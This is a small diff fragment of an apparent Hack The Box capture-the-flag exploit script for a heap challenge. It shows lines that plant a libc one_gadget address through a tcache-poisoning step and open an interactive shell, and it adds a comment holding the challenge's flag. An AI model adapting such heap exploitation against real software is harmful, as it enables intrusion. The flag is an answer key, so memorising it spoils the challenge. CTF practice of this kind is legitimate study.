@@ -70,3 +70,5 @@ one_gadget3 = 0x10a38c
 add_toxin(0x10, 1, b'B'*0x10)
 add_toxin(0x10, 2, p64(libc.address + one_gadget2))
 r.interactive()
+
+#HTB{tc4ch3_t0x1n4t10n???_0r_tc4ch3_p01So1n1NG??+F0rm4t...4m@ZiNg!!!}
